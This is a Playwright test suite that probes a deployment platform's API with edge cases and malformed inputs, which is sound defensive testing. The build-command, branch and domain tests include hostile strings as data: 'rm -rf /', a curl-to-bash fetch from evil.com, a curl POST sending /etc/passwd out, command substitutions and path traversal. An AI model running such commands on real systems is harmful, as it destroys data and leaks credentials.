import { test, expect } from '@playwright/test';
import {
  generateTestUser,
  signupTestUser,
  loginTestUser,
  createTestProject,
  deleteTestProject,
} from '../helpers/test-utils';

/**
 * DEPLOYMENT FLOW TESTS
 * Tests designed to break the deployment pipeline and find real bugs
 */

test.describe('Deployment Flow Breaking Tests', () => {
  let testUser: { email: string; password: string; name: string };
  const createdProjectIds: string[] = [];

  test.beforeAll(async () => {
    testUser = generateTestUser();
  });

  test.afterAll(async ({ request }) => {
    // Cleanup
    for (const id of createdProjectIds) {
      await deleteTestProject(request, id).catch(() => {});
    }
  });

  test.describe('Project Creation Edge Cases', () => {

    test('should handle project with invalid GitHub URL', async ({ request }) => {
      await signupTestUser(request, testUser);
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await createTestProject(request, {
        name: `Invalid URL Test - ${Date.now()}`,
        repoUrl: 'https://notgithub.com/test/repo',
      });

      // Should reject non-GitHub URLs or handle gracefully
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle project with private repo URL', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await createTestProject(request, {
        name: `Private Repo Test - ${Date.now()}`,
        repoUrl: 'https://github.com/private-org/private-repo',
      });

      // Should either reject or create (will fail at clone time)
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle project with non-existent repo', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await createTestProject(request, {
        name: `Non-existent Repo Test - ${Date.now()}`,
        repoUrl: 'https://github.com/this-org-does-not-exist-12345/repo',
      });

      expect(response.status()).toBeLessThan(500);
    });

    test('should handle project with malformed GitHub URL', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const malformedUrls = [
        'https://github.com/',
        'https://github.com/only-owner',
        'https://github.com//empty',
        'https://github.com/owner/repo/extra/path',
        'github.com/owner/repo',
        'ftp://github.com/owner/repo',
      ];

      for (const url of malformedUrls) {
        const response = await createTestProject(request, {
          name: `Malformed URL Test - ${Date.now()}`,
          repoUrl: url,
        });

        expect(response.status()).toBeLessThan(500);
      }
    });

    test('should handle project with all frameworks', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const frameworks = ['nextjs', 'vite', 'create-react-app', 'nuxt', 'svelte', 'astro', 'remix', 'gatsby', 'static'];

      for (const framework of frameworks) {
        const response = await createTestProject(request, {
          name: `Framework Test ${framework} - ${Date.now()}`,
          framework,
        });

        expect(response.status()).toBeLessThan(500);

        if (response.status() === 201) {
          const project = await response.json();
          createdProjectIds.push(project.id);
        }
      }
    });

    test('should handle project with invalid framework', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await createTestProject(request, {
        name: `Invalid Framework Test - ${Date.now()}`,
        framework: 'not-a-real-framework',
      });

      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Build Command Validation', () => {

    test('should reject dangerous build commands', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const dangerousCommands = [
        'npm run build; rm -rf /',
        'npm run build && curl evil.com | bash',
        'npm run build; cat /etc/passwd',
        '$(whoami)',
        '`id`',
        'npm run build || curl -X POST http://evil.com -d @/etc/passwd',
      ];

      for (const cmd of dangerousCommands) {
        const createResponse = await createTestProject(request, {
          name: `Dangerous Cmd Test - ${Date.now()}`,
        });

        if (createResponse.status() === 201) {
          const project = await createResponse.json();
          createdProjectIds.push(project.id);

          // Try to update with dangerous command
          const updateResponse = await request.patch(`/api/projects/${project.id}`, {
            data: { buildCmd: cmd },
          });

          // Should reject dangerous commands
          expect(updateResponse.status()).toBeLessThan(500);

          if (updateResponse.status() === 200) {
            // If it was accepted, the command should have been sanitized
            const getResponse = await request.get(`/api/projects/${project.id}`);
            const updatedProject = await getResponse.json();
            // Build command should not contain dangerous patterns
            expect(updatedProject.buildCmd).not.toMatch(/rm\s+-rf/);
            expect(updatedProject.buildCmd).not.toMatch(/curl\s+evil/);
          }
        }
      }
    });

    test('should accept safe build commands', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const safeCommands = [
        'npm run build',
        'npm ci && npm run build',
        'yarn build',
        'pnpm build',
        'npx next build',
        'tsc --build',
      ];

      for (const cmd of safeCommands) {
        const createResponse = await createTestProject(request, {
          name: `Safe Cmd Test - ${Date.now()}`,
        });

        if (createResponse.status() === 201) {
          const project = await createResponse.json();
          createdProjectIds.push(project.id);

          const updateResponse = await request.patch(`/api/projects/${project.id}`, {
            data: { buildCmd: cmd },
          });

          // Should accept safe commands
          expect(updateResponse.status()).toBeLessThan(500);
        }
      }
    });
  });

  test.describe('Deployment Trigger Edge Cases', () => {

    test('should handle deploy request without project', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await request.post('/api/deploy', {
        data: {},
      });

      expect(response.status()).toBeLessThan(500);
      expect(response.status()).not.toBe(200);
    });

    test('should handle deploy for non-existent project', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await request.post('/api/deploy', {
        data: {
          projectId: 'non-existent-project-12345',
        },
      });

      expect([400, 404, 401]).toContain(response.status());
    });

    test('should handle concurrent deployments for same project', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Concurrent Deploy Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      // Trigger multiple deployments concurrently
      const deployPromises = Array(3).fill(null).map(() =>
        request.post('/api/deploy', {
          data: { projectId: project.id },
        })
      );

      const responses = await Promise.all(deployPromises);

      // None should be 500
      for (const response of responses) {
        expect(response.status()).toBeLessThan(500);
      }
    });

    test('should handle deploy with custom branch', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Branch Deploy Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const response = await request.post('/api/deploy', {
        data: {
          projectId: project.id,
          branch: 'feature/test-branch',
        },
      });

      expect(response.status()).toBeLessThan(500);
    });

    test('should handle deploy with invalid branch name', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Invalid Branch Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const invalidBranches = [
        '../../../etc/passwd',
        'branch; rm -rf /',
        'branch\x00inject',
        '',
        '   ',
      ];

      for (const branch of invalidBranches) {
        const response = await request.post('/api/deploy', {
          data: {
            projectId: project.id,
            branch,
          },
        });

        expect(response.status()).toBeLessThan(500);
      }
    });
  });

  test.describe('Deployment Status and Logs', () => {

    test('should handle getting status of non-existent deployment', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await request.get('/api/deployments/non-existent-12345');

      expect([404, 401]).toContain(response.status());
    });

    test('should handle getting logs of non-existent deployment', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await request.get('/api/deployments/non-existent-12345/logs');

      expect(response.status()).toBeLessThan(500);
    });

    test('should handle cancelling non-existent deployment', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await request.post('/api/deployments/non-existent-12345/cancel');

      expect(response.status()).toBeLessThan(500);
    });

    test('should handle rollback to non-existent deployment', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Rollback Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const response = await request.post(`/api/projects/${project.id}/rollback`, {
        data: {
          deploymentId: 'non-existent-deployment-12345',
        },
      });

      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Domain Configuration Edge Cases', () => {

    test('should handle adding invalid domain', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Domain Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const invalidDomains = [
        '',
        'not a domain',
        'http://example.com',
        '../../etc/passwd',
        'domain.com; rm -rf /',
        'localhost',
        '127.0.0.1',
        'x'.repeat(500) + '.com',
      ];

      for (const domain of invalidDomains) {
        const response = await request.post(`/api/projects/${project.id}/domains`, {
          data: { domain },
        });

        expect(response.status()).toBeLessThan(500);
      }
    });

    test('should handle adding duplicate domain', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Duplicate Domain Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const domain = `test-${Date.now()}.example.com`;

      // Add domain first time
      await request.post(`/api/projects/${project.id}/domains`, {
        data: { domain },
      });

      // Try to add same domain again
      const response = await request.post(`/api/projects/${project.id}/domains`, {
        data: { domain },
      });

      expect(response.status()).toBeLessThan(500);
      // Should either reject or be idempotent
    });

    test('should handle removing non-existent domain', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Remove Domain Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const response = await request.delete(`/api/projects/${project.id}/domains/non-existent.example.com`);

      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Preview Deployment Edge Cases', () => {

    test('should handle creating preview for non-existent PR', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Preview PR Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const response = await request.post('/api/deploy', {
        data: {
          projectId: project.id,
          isPreview: true,
          prNumber: 999999,
        },
      });

      expect(response.status()).toBeLessThan(500);
    });

    test('should handle preview with negative PR number', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Negative PR Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const response = await request.post('/api/deploy', {
        data: {
          projectId: project.id,
          isPreview: true,
          prNumber: -1,
        },
      });

      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Analytics Edge Cases', () => {

    test('should handle analytics ingestion with invalid data', async ({ request }) => {
      const invalidPayloads = [
        {},
        { event: null },
        { event: '', projectId: '' },
        { event: 'x'.repeat(10000) },
        { event: 'test', properties: 'not-an-object' },
      ];

      for (const payload of invalidPayloads) {
        const response = await request.post('/api/analytics/ingest', {
          data: payload,
        });

        expect(response.status()).toBeLessThan(500);
      }
    });

    test('should handle getting analytics for non-existent project', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const response = await request.get('/api/analytics/non-existent-project-12345');

      expect(response.status()).toBeLessThan(500);
    });

    test('should handle analytics with invalid date range', async ({ request }) => {
      await loginTestUser(request, testUser.email, testUser.password);

      const createResponse = await createTestProject(request, {
        name: `Analytics Date Test - ${Date.now()}`,
      });

      if (createResponse.status() !== 201) return;

      const project = await createResponse.json();
      createdProjectIds.push(project.id);

      const invalidDateRanges = [
        '?from=invalid&to=invalid',
        '?from=2025-01-01&to=2020-01-01', // End before start
        '?from=9999-99-99&to=9999-99-99',
      ];

      for (const query of invalidDateRanges) {
        const response = await request.get(`/api/projects/${project.id}/analytics${query}`);
        expect(response.status()).toBeLessThan(500);
      }
    });
  });
});
